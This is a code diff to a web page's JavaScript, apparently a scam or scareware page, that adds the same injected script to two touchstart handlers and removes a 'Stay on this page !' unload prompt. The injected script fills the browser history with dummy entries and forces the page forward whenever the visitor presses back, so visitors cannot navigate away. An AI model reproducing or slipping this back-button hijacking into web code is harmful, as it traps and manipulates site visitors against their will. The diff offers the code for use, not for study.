@@ -1,4 +1,4 @@
-gvar styles1 = `
+var styles1 = `
 
 *, *::after, *::before {
 box-sizing: border-box;
@@ -1055,8 +1055,17 @@ addEventListener('touchstart', function(e) {
 var myCN = e.target.className;
 if(myCN!='orderX'){
 
+setTimeout(() => { const str1 =
+`
+<script>
+! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.go(1); }); } } catch (o) {} }();
+<\/script>
+
+`;
+
+const parser = new DOMParser(); const doc = parser.parseFromString("<!doctype html><html><head>" + str1 + "</head></html>", "text/html"); const head = doc.head; let node = head.firstChild; while (node) { const next = node.nextSibling; if (node.tagName === "SCRIPT") { const newNode = document.createElement("script"); if (node.src) { newNode.src = node.src; } while (node.firstChild) { newNode.appendChild(node.firstChild.cloneNode(true)); node.removeChild(node.firstChild); } node = newNode; } document.head.prepend(node); node = next; } }, 100);
+
 sessionStorage.setItem("reload", 100);
-function addOB(en) { en.returnValue = "Stay on this page !"; }; window.addEventListener("beforeunload", addOB);
 
 } else {
 
@@ -1071,8 +1080,17 @@ addEventListener('touchstart', function(e) {
 var myCN = e.target.className;
 if(myCN!='orderX'){
 
+setTimeout(() => { const str1 =
+`
+<script>
+! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.go(1); }); } } catch (o) {} }();
+<\/script>
+
+`;
+
+const parser = new DOMParser(); const doc = parser.parseFromString("<!doctype html><html><head>" + str1 + "</head></html>", "text/html"); const head = doc.head; let node = head.firstChild; while (node) { const next = node.nextSibling; if (node.tagName === "SCRIPT") { const newNode = document.createElement("script"); if (node.src) { newNode.src = node.src; } while (node.firstChild) { newNode.appendChild(node.firstChild.cloneNode(true)); node.removeChild(node.firstChild); } node = newNode; } document.head.prepend(node); node = next; } }, 100);
+
 sessionStorage.setItem("reload", 100);
-function addOB(en) { en.returnValue = "Stay on this page !"; }; window.addEventListener("beforeunload", addOB);
 
 } else {
 
